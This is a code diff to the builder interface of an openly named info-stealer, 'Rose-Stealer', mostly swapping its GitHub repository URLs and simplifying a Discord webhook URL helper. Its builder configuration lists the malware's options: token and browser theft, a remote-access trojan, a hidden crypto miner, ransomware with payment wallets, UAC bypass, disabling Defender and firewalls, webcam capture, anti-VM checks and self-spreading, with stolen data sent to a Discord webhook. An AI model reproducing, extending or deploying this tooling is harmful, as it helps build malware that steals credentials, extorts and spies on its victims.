@@ -32,15 +32,15 @@ logging.basicConfig(level=logging.DEBUG, filename="roselog.log", filemode="a", f
 logger = logging.getLogger(__name__)
 
 __title__ = 'Rose UI Builder'
-__avatar__ = 'https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png'
+__avatar__ = 'https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png'
 __version__ = '2.3'
 __debugm__ = True
-__icon__ = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png"
-__devmsg__ = requests.get("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")
+__icon__ = "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png"
+__devmsg__ = requests.get("https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/ui/msg.txt").text.splitlines()[0].split(" - ")
 
 data_builder = {"webhook_url": "", "build_name": "", "startup": False, "injection": False, "token": False, "browser": False, "deviceinf": False, "ipinf": False, "roblox": False, "rose_rat": False, "rose_rat_url": "", "knight_rat": False, "knight_bot_token": "", "knight_channel_id": "", "knight_prefix": "", "screenshot": False, "ping": False, "fake_error": False, "silent_crypto_miner": False, "wallet_adress": "", "file_pumper": False, "file_pumper_size": "", "uac_bypass": False, "disable_defender": False, "disable_firewalls": False, "antivm": False, "webcam": False, "obfuscation": False, "type_file": "", "ransomware_monero_wallet_adress": "", "ransomware_email_adress": "", "ransomware_discord_webhook_url": "", "ransomware": False, "extension_spoofer": False, "spoofed_extension": "", "spread_malware": False, "spread_malware_message": "", "ransomware_amount_of_money": "", "rose_melt_stub": False, "games": False, "tbsod": False, "bsites": False, "disableprot": False}
 
-links = {"xpierroz_github": "https://github.com/xpierroz", "xpierroz_insta": "https://www.instagram.com/_p.slm/", "gumbobr0t_github": "https://github.com/gumbobr0t", "suegdu_github": "https://github.com/suenerve", "svn_github": "https://github.com/suvan1911", "smth_github": "https://github.com/smthpy", "rose_github": "https://github.com/DamagingRose/Rose-Grabber", "rose_discord": "https://discord.gg/sMawrDqnta"}
+links = {"xpierroz_github": "https://github.com/xpierroz", "xpierroz_insta": "https://www.instagram.com/_p.slm/", "gumbobr0t_github": "https://github.com/gumbobr0t", "suegdu_github": "https://github.com/suenerve", "svn_github": "https://github.com/suvan1911", "smth_github": "https://github.com/smthpy", "rose_github": "https://github.com/rose-dll/Rose-Stealer", "rose_discord": "https://discord.gg/sMawrDqnta"}
 
 logger.critical(f"Rose UI Builder is using version {str(__version__)}")
 
@@ -53,7 +53,7 @@ def auto_update():
     if __debugm__:
         return
 
-    _code = "https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/ui/builder.py"
+    _code = "https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/ui/builder.py"
 
     code = requests.get(_code, timeout=10).text
     pattern = r"__version__ = '([\d\.]+)'"
@@ -63,7 +63,7 @@ def auto_update():
         if version != __version__:
             f = ctypes.windll.user32.MessageBoxW(0, f"A new version has been detected.\nWould you like to download the new version?\nCurrent version: {str(__version__)} | New version {str(version)}", "Rose-Grabber", 4)
             if f == 6:
-                webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip")
+                webbrowser.open("https://github.com/rose-dll/Rose-Stealer/archive/refs/heads/main.zip")
                 os._exit(0)
 
 
@@ -84,14 +84,11 @@ async def _test_webhook():
 
 
 def replace_discord_url(url):
-    match = re.match(r"https:\/\/discordapp\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+", url)
-    if match:
-        new_url = match.group(0).replace("discordapp.com", "discord.com")
-        new_url = match.group(0).replace("canary.", "")
-        new_url = match.group(0).replace("ptb.", "")
-        return new_url
-    else:
-        return url
+    url = url.replace("discordapp.com", "discord.com")
+    url = url.replace("canary.", "")
+    url = url.replace("ptb.", "")
+    
+    return url
 
 
 async def test_webhook(webhook_url):
@@ -100,7 +97,7 @@ async def test_webhook(webhook_url):
             embed = Embed(description="Webhook is Working", color=11795068, timestamp="now")
             embed.set_author(name="Success", icon_url=__icon__)
             embed.set_footer(text="Rose-Stealer | t.me/rosegrabber", icon_url=__icon__)
-            await hook.send(embed=embed, username="Rose-Stealer | t.me/rosegrabber", avatar_url="https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png")
+            await hook.send(embed=embed, username="Rose-Stealer | t.me/rosegrabber", avatar_url="https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png")
         return 0
     except Exception as e:
         logger.error(f"Webhook failed to execute - Link: {webhook_url} - Error: {e}")
@@ -466,9 +463,9 @@ def _home():
 def _features():
     with ui.card():
         with ui.row():
-            ui.button("Knight RAT Docs", on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/KNIGHT.md"))
-            ui.button("Features Docs", on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/FEATURES.md"))
-            ui.button("Changelog Docs", on_click=lambda: webbrowser.open("https://github.com/DamagingRose/Rose-Grabber/blob/main/docs/CHANGELOG.md"))
+            ui.button("Knight RAT Docs", on_click=lambda: webbrowser.open("https://github.com/rose-dll/Rose-Stealer/blob/main/docs/KNIGHT.md"))
+            ui.button("Features Docs", on_click=lambda: webbrowser.open("https://github.com/rose-dll/Rose-Stealer/blob/main/docs/FEATURES.md"))
+            ui.button("Changelog Docs", on_click=lambda: webbrowser.open("https://github.com/rose-dll/Rose-Stealer/blob/main/docs/CHANGELOG.md"))
 
         with ui.expansion("System", icon="work").classes("w-full"):
             with ui.row():
@@ -583,7 +580,7 @@ ui.colors(primary="#333")
 
 @ui.page("/home")
 def superhome():
-    ui.image("https://raw.githubusercontent.com/DamagingRose/Rose-Grabber/main/resources/assets/rose.png").style("position: center; width: 90px; left: 220px;")
+    ui.image("https://raw.githubusercontent.com/rose-dll/Rose-Stealer/main/resources/assets/rose.png").style("position: center; width: 90px; left: 220px;")
 
     global tabs
     with ui.tabs().classes("w-full") as tabs:
@@ -600,7 +597,7 @@ def superhome():
             _github()
 
 
-v = ui.video("https://github.com/DamagingRose/Rose-Grabber/raw/main/resources/assets/roseloadingscreen.mp4", autoplay=True, loop=False, muted=True, controls=False).style("position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;")
+v = ui.video("https://github.com/rose-dll/Rose-Stealer/raw/main/resources/assets/roseloadingscreen.mp4", autoplay=True, loop=False, muted=True, controls=False).style("position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover;")
 v.on("ended", lambda _: ui.open("/home"))
 app.on_shutdown(pool.shutdown)
 
